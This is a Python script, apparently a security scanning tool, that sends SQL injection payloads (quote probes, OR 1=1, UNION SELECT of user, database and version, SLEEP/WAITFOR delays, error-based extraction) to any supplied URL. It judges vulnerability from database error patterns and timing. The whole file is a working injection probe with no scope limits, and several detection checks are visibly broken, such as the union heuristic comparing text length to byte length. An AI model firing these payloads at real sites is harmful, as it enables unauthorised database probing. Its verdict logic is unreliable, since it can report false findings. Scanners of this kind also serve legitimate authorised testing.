#!/usr/bin/env python3
"""
SQL Injection Tester
Tests for SQL injection vulnerabilities using various techniques
"""

import sys
import json
import requests
import time
import re
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def test_sqli(url: str, parameter: str, test_type: str = 'basic') -> List[Dict]:
    """Test for SQL injection vulnerabilities"""
    results = []
    
    # Parse URL
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # SQL Injection payloads
    payloads = {
        'basic': [
            ("'", 'error', 'Single quote'),
            ("\"", 'error', 'Double quote'),
            ("' OR '1'='1", 'boolean', 'Basic OR injection'),
            ("' OR 1=1--", 'boolean', 'OR injection with comment'),
            ("' UNION SELECT NULL--", 'union', 'Union-based injection'),
            ("' AND 1=1--", 'boolean', 'AND injection'),
            ("' AND 1=2--", 'boolean', 'AND false injection'),
        ],
        'union': [
            ("' UNION SELECT NULL--", 'union', 'Union SELECT NULL'),
            ("' UNION SELECT 1,2,3--", 'union', 'Union SELECT multiple columns'),
            ("' UNION SELECT user(),database(),version()--", 'union', 'Union SELECT system info'),
        ],
        'boolean': [
            ("' AND 1=1--", 'boolean', 'Boolean true'),
            ("' AND 1=2--", 'boolean', 'Boolean false'),
            ("' OR 'a'='a", 'boolean', 'OR boolean'),
            ("' OR 'a'='b", 'boolean', 'OR boolean false'),
        ],
        'time': [
            ("'; WAITFOR DELAY '0:0:5'--", 'time', 'Time-based delay (SQL Server)'),
            ("' OR SLEEP(5)--", 'time', 'Time-based sleep (MySQL)'),
            ("' OR pg_sleep(5)--", 'time', 'Time-based sleep (PostgreSQL)'),
        ],
        'error': [
            ("' AND 1=CONVERT(int, @@version)--", 'error', 'Error-based version (SQL Server)'),
            ("' AND extractvalue(1,concat(0x7e,version(),0x7e))--", 'error', 'Error-based (MySQL)'),
            ("' AND 1=CAST((SELECT version()) AS int)--", 'error', 'Error-based cast'),
        ],
    }
    
    test_payloads = payloads.get(test_type, payloads['basic'])
    
    for payload, technique, description in test_payloads:
        try:
            # Construct test URL
            test_params = params.copy()
            if parameter in test_params:
                test_params[parameter] = [payload]
            else:
                test_params[parameter] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            # Send request
            start_time = time.time()
            try:
                response = requests.get(test_url, timeout=10, allow_redirects=False)
                elapsed = time.time() - start_time
            except:
                continue
            
            # Analyze response
            vulnerable = False
            severity = 'low'
            
            # Check for error messages
            error_patterns = [
                r"SQL syntax.*MySQL",
                r"Warning.*\Wmysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_",
                r"valid PostgreSQL result",
                r"SQLite.*error",
                r"SQLiteException",
                r"Microsoft.*ODBC.*SQL Server",
                r"SQLServer JDBC Driver",
                r"SqlException",
                r"ORA-\d{5}",
                r"Oracle.*Driver",
                r"Warning.*\Woci_",
                r"Warning.*\Wora_",
            ]
            
            response_text = response.text.lower()
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerable = True
                    severity = 'critical'
                    break
            
            # Check for time-based injection
            if technique == 'time' and elapsed > 4:
                vulnerable = True
                severity = 'high'
            
            # Check for boolean-based injection
            if technique == 'boolean':
                # Would need baseline comparison
                if 'error' in response_text or 'exception' in response_text:
                    vulnerable = True
                    severity = 'medium'
            
            # Check for union-based injection
            if technique == 'union':
                if 'union' in response_text or len(response.text) > len(response.content) * 2:
                    vulnerable = True
                    severity = 'high'
            
            results.append({
                'vulnerable': vulnerable,
                'payload': payload,
                'technique': technique,
                'severity': severity if vulnerable else 'low',
                'description': description,
                'response': response.text[:200] if vulnerable else None,
            })
            
            # Small delay between requests
            time.sleep(0.5)
            
        except Exception as e:
            results.append({
                'vulnerable': False,
                'payload': payload,
                'technique': technique,
                'severity': 'low',
                'description': f'{description} - Error: {str(e)}',
            })
    
    return results

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'URL required'}))
        sys.exit(1)
    
    url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else 'id'
    test_type = sys.argv[3] if len(sys.argv) > 3 else 'basic'
    
    results = test_sqli(url, parameter, test_type)
    print(json.dumps({'success': True, 'results': results}))

